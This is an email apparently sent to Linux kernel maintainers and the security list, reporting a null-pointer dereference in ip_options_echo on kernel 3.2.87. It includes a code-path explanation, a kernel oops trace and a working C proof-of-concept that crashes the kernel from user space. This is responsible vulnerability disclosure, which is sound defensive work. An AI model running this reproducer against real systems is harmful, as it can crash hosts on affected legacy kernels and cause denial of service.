From: Anarcheuz Fritz <anarcheuz@gmail.com>
Subject: PROBLEM: null-ptr deref in ip_options_echo may lead to denial of service
Date: Mon, 20 Mar 2017 12:59:34 +0800
Message-ID: <CAC9A2PqFcJ2k5Nm8QyxbOrO6rQnfHxcPvsnkzPMGUuJ5hCXM1Q@mail.gmail.com>
Mime-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Cc: security@kernel.org, netdev@vger.kernel.org
To: davem@davemloft.net
Return-path: <netdev-owner@vger.kernel.org>
Received: from mail-qk0-f172.google.com ([209.85.220.172]:34535 "EHLO
        mail-qk0-f172.google.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
        with ESMTP id S1750867AbdCTE7g (ORCPT
        <rfc822;netdev@vger.kernel.org>); Mon, 20 Mar 2017 00:59:36 -0400
Received: by mail-qk0-f172.google.com with SMTP id p64so101691891qke.1
        for <netdev@vger.kernel.org>; Sun, 19 Mar 2017 21:59:35 -0700 (PDT)
Sender: netdev-owner@vger.kernel.org
List-ID: <netdev.vger.kernel.org>

Hi David,


While working on some legacy kernel I stumbled upon a null-ptr deref in
ip_options_echo. The bug has been verified on the latest version
3.2.87 from the supported long-term branch.


Description

===========

The 2 setsockopt in the reproducer are required in order to reach the
code path of ip_options_echo.
The one on the receiving socket will enable IP_CMSG_RETOPTS and the
second one will make sure that an opt is being sent with our skb. The
issue seems to lie in ip_queue_rcv_skb which will set skb->_skb_refdst
to 0 if a flag is not present :

int ip_queue_rcv_skb(struct sock *sk, struct sk_buff *skb)
{
    if (!(inet_sk(sk)->cmsg_flags & IP_CMSG_PKTINFO))
        skb_dst_drop(skb);

    return sock_queue_rcv_skb(sk, skb);
}

which then cause ip_options_echo to deref a null-ptr:

int ip_options_echo(struct ip_options *dopt, struct sk_buff *skb)
{
...
    skb_rtable(skb)->rt_spec_dst;
...
}

[ 1431.152937] Unable to handle kernel NULL pointer dereference at
virtual address 00000080
[ 1431.153777] pgd = eec6c000
[ 1431.153942] [00000080] *pgd=8ec5d831, *pte=00000000, *ppte=00000000
[ 1431.154249] Internal error: Oops: 17 [#2] PREEMPT SMP
[ 1431.154580] CPU: 2    Tainted: G      D W     (3.2.87 #35)
[ 1431.154968] PC is at ip_options_echo+0x38/0x394
[ 1431.155120] LR is at ip_options_echo+0x18/0x394
[ 1431.155274] pc : [<c039c72c>]    lr : [<c039c70c>]    psr: 20000013
[ 1431.155288] sp : eec49d00  ip : 00000000  fp : c058e5a0
[ 1431.155606] r10: 00000000  r9 : 00000001  r8 : 00000000
[ 1431.155767] r7 : ef9a2b10  r6 : ef964cc0  r5 : eec49d40  r4 : eec49d30
[ 1431.155961] r3 : 00000000  r2 : 00000000  r1 : ffffffd0  r0 : eec49d40
[ 1431.156180] Flags: nzCv  IRQs on  FIQs on  Mode SVC_32  ISA ARM  Segment user
[ 1431.156397] Control: 10c53c7d  Table: 8ec6c06a  DAC: 00000015
[ 1431.156577] Process poc (pid: 794, stack limit = 0xeec482f0)
[ 1431.156764] Stack: (0xeec49d00 to 0xeec4a000)
[ 1431.157015] 9d00: 00000000 ef1c4240 00000001 ef964cc0 eec49ef4
eec49ef4 00000000 00000001
[ 1431.157268] 9d20: 00000000 c03a1478 ef1c4000 c035f58c 00000000
00000000 00000000 00000000
[ 1431.157512] 9d40: eec48010 00000000 c039fe40 00000000 eec49d70
eec49eec 00000000 ef964cc0
[ 1431.157764] 9d60: 00000000 ef1c4000 eec49ef4 ef964cc0 00000000
ef1c4000 eec49ef4 c03bfadc
[ 1431.158006] 9d80: 00000000 00000000 c0563b10 00000000 00000000
00000000 0100007f c03bf7d0
[ 1431.158244] 9da0: ef1c4000 eec49ef4 eec49e38 00000000 ef956d80
00000000 00000000 c03c8298
[ 1431.158485] 9dc0: 00000000 00000001 eec49dd4 c002e054 ef1c4240
00000000 c03c81f8 ef4ad6c0
[ 1431.158728] 9de0: 00000001 00000000 eec49ef4 c03541bc 00000001
c000e044 eec48000 00000000
[ 1431.158969] 9e00: 00000001 00000000 ef4ad6c0 eec48000 00000000
eec49ef4 ef4ad520 c0563b10
[ 1431.159209] 9e20: 00000000 eec49ef4 00000300 c0f190b8 ef1d0160
20008000 eec48008 00000001
[ 1431.159449] 9e40: 00000000 00000001 ffffffff 00000000 00000000
00000000 00000000 00000000
[ 1431.159689] 9e60: ef956d80 00000000 00000000 00000000 ef956d80
00000008 eec49df8 00000000
[ 1431.159931] 9e80: ef90e000 c03c107c eec49e08 00000000 00000000
ef90c008 ef1c4000 20008000
[ 1431.160171] 9ea0: ef911380 ef1d0160 00000001 eec6c800 eec6c000
ef4ad520 eec49ee4 00000000
[ 1431.160411] 9ec0: ef4ad6c0 00000000 00000001 2000ffff eec48000
00000000 00000000 c0355f38
[ 1431.160653] 9ee0: ef911380 fffffff7 00000000 2000ffff 00000000
00000000 00000000 eec49eec
[ 1431.160896] 9f00: 00000001 00000000 00000000 00000000 00020002
00000000 00000000 00000000
[ 1431.161139] 9f20: 00000000 00000000 00000020 ef4ad6e0 00000000
eec49f5c 00000003 c009d16c
[ 1431.161382] 9f40: 00000007 00000000 ef1c4000 20001000 00000001
eec48000 00000000 c03a2ca8
[ 1431.161634] 9f60: 00000001 00000001 c03597bc 00000007 20001000
00000001 ef4ad6c0 c0356010
[ 1431.161875] 9f80: 00000001 c0354c2c 00000000 00000000 00000000
00000000 00000000 00000124
[ 1431.162116] 9fa0: c000e044 c000dec0 00000000 00000000 00000004
2000ffff 00000000 00000001
[ 1431.162357] 9fc0: 00000000 00000000 00000000 00000124 00080520
00000000 00000000 00000000
[ 1431.162654] 9fe0: beff8c08 beff8bfc 00010a23 00010a6c 40000030
00000004 00000000 00000000
[ 1431.163212] [<c039c72c>] (ip_options_echo+0x38/0x394) from
[<c03a1478>] (ip_cmsg_recv+0x1c8/0x204)
[ 1431.163498] [<c03a1478>] (ip_cmsg_recv+0x1c8/0x204) from
[<c03bfadc>] (udp_recvmsg+0x30c/0x33c)
[ 1431.163761] [<c03bfadc>] (udp_recvmsg+0x30c/0x33c) from
[<c03c8298>] (inet_recvmsg+0xa0/0xb4)
[ 1431.164062] [<c03c8298>] (inet_recvmsg+0xa0/0xb4) from [<c03541bc>]
(sock_recvmsg+0xa8/0xcc)
[ 1431.164356] [<c03541bc>] (sock_recvmsg+0xa8/0xcc) from [<c0355f38>]
(sys_recvfrom+0x90/0xe8)
[ 1431.164619] [<c0355f38>] (sys_recvfrom+0x90/0xe8) from [<c000dec0>]
(ret_fast_syscall+0x0/0x30)
[ 1431.164973] Code: e2845010 e5d62022 e5967090 e3c33001 (e5933080)



Repro

=====

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/types.h>

struct in_addr {
    unsigned long s_addr;          // load with inet_pton()
};

struct sockaddr_in {
    short            sin_family;   // e.g. AF_INET, AF_INET6
    unsigned short   sin_port;     // e.g. htons(3490)
    struct in_addr   sin_addr;     // see struct in_addr, below
    char             sin_zero[8];  // zero this if you want to
};

int main()
{
    char buffer[128];
    int fd1, fd2;
    char optval1 = 0x0, optval2 = 0x1;
    struct sockaddr_in addr;

    addr.sin_family = 0x2;
    addr.sin_port = 0x2;
    addr.sin_addr.s_addr = 0x0;

    fd1 = socket(AF_INET, SOCK_DGRAM, 0x0ul);
    fd2 = socket(AF_INET, SOCK_DGRAM, 0x0ul);

    bind(fd2, (struct sockaddr *)&addr, sizeof(struct sockaddr_in));

    setsockopt(fd1, 0x0ul, 0x4ul, (void *)&optval1, sizeof(optval1));
    setsockopt(fd2, 0x0ul, 0x7ul, (void *)&optval2, sizeof(optval2));


    sendto(fd1, buffer, sizeof(buffer), 0x0ul, (struct sockaddr
*)&addr, sizeof(struct sockaddr_in));

    recvfrom(fd2, buffer, sizeof(buffer), 0x0, 0x0ul, 0x0ul);

    return 0;
}





Patch

=====

Upper versions of Linux Kernel are not affected due to different code logic.



Best Regards,

Anthony
